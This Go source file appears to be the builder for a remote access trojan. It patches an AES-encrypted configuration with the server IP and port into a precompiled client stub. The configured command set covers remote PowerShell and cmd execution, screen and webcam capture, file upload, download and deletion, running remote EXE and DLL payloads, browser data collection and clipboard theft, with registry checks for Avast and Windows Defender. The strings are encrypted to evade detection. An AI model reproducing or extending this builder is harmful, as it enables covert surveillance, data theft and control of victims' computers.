package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
)

const (
	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV  = "A1B2C3D4E5F6A7B8"
)

var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

type Config struct {
	IP   string `json:"ip"`
	Port int    `json:"port"`

	// Command Strings
	SPing     string `json:"s_ping"`
	SPong     string `json:"s_pong"`
	SMsg      string `json:"s_msg"`
	SExecPs   string `json:"s_exec_ps"`
	SExecCmd  string `json:"s_exec_cmd"`
	SPsOut    string `json:"s_ps_out"`
	SCmdOut   string `json:"s_cmd_out"`
	SScrStop  string `json:"s_scr_stop"`
	SCamStop  string `json:"s_cam_stop"`
	STasklist string `json:"s_tasklist"`
	STaskkill string `json:"s_taskkill"`
	SLs       string `json:"s_ls"`
	SLsRes    string `json:"s_ls_res"`
	SDownload string `json:"s_download"`
	SDelete   string `json:"s_delete"`
	SMkdir    string `json:"s_mkdir"`
	SUpload   string `json:"s_upload"`
	SRename   string `json:"s_rename"`
	SRfeExe   string `json:"s_rfe_exe"`
	SRfeDll   string `json:"s_rfe_dll"`
	SBrowser  string `json:"s_browser"`
	SClipGet  string `json:"s_clip_get"`
	SClipSet  string `json:"s_clip_set"`
	SUninstall string `json:"s_uninstall"`
	SClose    string `json:"s_close"`
	SReconnect string `json:"s_reconnect"`
	SSetDelay string `json:"s_set_delay"`
	SScrStart string `json:"s_scr_start"`
	SCamStart string `json:"s_cam_start"`
	SSysinfo  string `json:"s_sysinfo"`
	SResponse string `json:"s_response"`
	SCommand  string `json:"s_command"`
	SSession  string `json:"s_session"`

	// Registry & System Strings
	SRegWinKey     string `json:"s_reg_win_key"`
	SRegProdName   string `json:"s_reg_prod_name"`
	SRegBuild      string `json:"s_reg_build"`
	SRegDisplay    string `json:"s_reg_display"`
	SRegRelease    string `json:"s_reg_release"`
	SRegAvKey      string `json:"s_reg_av_key"`
	SRegDefenderKey string `json:"s_reg_defender_key"`
	SRegDisSpy     string `json:"s_reg_dis_spy"`
	SRegGpuKey     string `json:"s_reg_gpu_key"`
	SRegGpuDesc    string `json:"s_reg_gpu_desc"`
	SRegCpuKey     string `json:"s_reg_cpu_key"`
	SRegCpuName    string `json:"s_reg_cpu_name"`

	// HTTP/IP Strings
	SHttpUa   string `json:"s_http_ua"`
	SHttpHost string `json:"s_http_host"`
	SHttpPath string `json:"s_http_path"`
}

func main() {
	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	flag.Parse()

	args := flag.Args()
	if len(args) >= 1 {
		*ip = args[0]
	}
	if len(args) >= 2 {
		fmt.Sscanf(args[1], "%d", port)
	}

	fmt.Printf("[+] Patching stub with config for %s:%d\n", *ip, *port)

	stubPath := "stub.exe"
	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
		stubPath = "client/client_c.exe"
		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
		}
	}

	data, err := ioutil.ReadFile(stubPath)
	if err != nil {
		log.Fatalf("[-] Error reading stub: %v", err)
	}

	var indices []int
	searchData := data
	offset := 0
	for {
		idx := bytes.Index(searchData, marker)
		if idx == -1 {
			break
		}
		indices = append(indices, offset+idx)
		searchData = searchData[idx+1:]
		offset += idx + 1
	}

	if len(indices) == 0 {
		log.Fatalf("[-] Error: Marker not found in stub binary.")
	}

	targetIndex := -1
	if len(indices) == 1 {
		targetIndex = indices[0]
	} else {
		maxZeros := -1
		for _, idx := range indices {
			if idx+len(marker)+2032 > len(data) {
				continue
			}
			zeros := 0
			for i := 0; i < 2032; i++ {
				if data[idx+len(marker)+i] == 0 {
					zeros++
				}
			}
			if zeros > maxZeros {
				maxZeros = zeros
				targetIndex = idx
			}
		}
	}

	if targetIndex == -1 {
		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
	}

	config := Config{
		IP:   *ip,
		Port: *port,

		SPing:     "ping",
		SPong:     "pong",
		SMsg:      "[msg] ",
		SExecPs:   "[exec_ps]",
		SExecCmd:  "[exec_cmd]",
		SPsOut:    "[ps_output]",
		SCmdOut:   "[cmd_output]",
		SScrStop:  "[screen_stop]",
		SCamStop:  "[cam_stop]",
		STasklist: "[tasklist]",
		STaskkill: "[taskkill]",
		SLs:       "[ls]",
		SLsRes:    "[ls_result]",
		SDownload: "[download]",
		SDelete:   "[delete]",
		SMkdir:    "[mkdir]",
		SUpload:   "[upload]",
		SRename:   "[rename]",
		SRfeExe:   "[rfe_exe]",
		SRfeDll:   "[rfe_dll]",
		SBrowser:  "[browser_collect]",
		SClipGet:  "[clipboard_get]",
		SClipSet:  "[clipboard_set]",
		SUninstall: "[uninstall]",
		SClose:    "[close]",
		SReconnect: "[reconnect]",
		SSetDelay: "[set_delay]",
		SScrStart: "[screen_start]",
		SCamStart: "[cam_start]",
		SSysinfo:  "[sysinfo]",
		SResponse: "response",
		SCommand:  "command",
		SSession:  "session",

		SRegWinKey:      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
		SRegProdName:    "ProductName",
		SRegBuild:       "CurrentBuild",
		SRegDisplay:     "DisplayVersion",
		SRegRelease:     "ReleaseId",
		SRegAvKey:       "SOFTWARE\\AVAST Software\\Avast",
		SRegDefenderKey: "SOFTWARE\\Microsoft\\Windows Defender",
		SRegDisSpy:      "DisableAntiSpyware",
		SRegGpuKey:      "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
		SRegGpuDesc:     "DriverDesc",
		SRegCpuKey:      "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
		SRegCpuName:     "ProcessorNameString",

		SHttpUa:   "client/1.0",
		SHttpHost: "ipinfo.io",
		SHttpPath: "/country",
	}

	configBytes, err := json.Marshal(config)
	if err != nil {
		log.Fatalf("[-] Error marshalling config: %v", err)
	}

	encryptedConfig := encrypt(configBytes)
	if len(encryptedConfig) > 2032 {
		log.Fatalf("[-] Error: Encrypted config is too large (%d bytes, max 2032).", len(encryptedConfig))
	}

	finalPayload := make([]byte, 2032)
	copy(finalPayload, encryptedConfig)

	patchedData := make([]byte, len(data))
	copy(patchedData, data)
	copy(patchedData[targetIndex+len(marker):], finalPayload)

	err = ioutil.WriteFile("client.exe", patchedData, 0755)
	if err != nil {
		log.Fatalf("[-] Error writing client.exe: %v", err)
	}

	fmt.Println("[+] Successfully built client.exe")
}

func encrypt(plaintext []byte) []byte {
	block, err := aes.NewCipher([]byte(ConfigKey))
	if err != nil {
		log.Fatalf("[-] AES error: %v", err)
	}

	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
	if padding == 0 {
		padding = aes.BlockSize
	}
	padtext := bytes.Repeat([]byte{0}, padding)
	plaintext = append(plaintext, padtext...)

	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, []byte(ConfigIV))
	mode.CryptBlocks(ciphertext, plaintext)

	return ciphertext
}
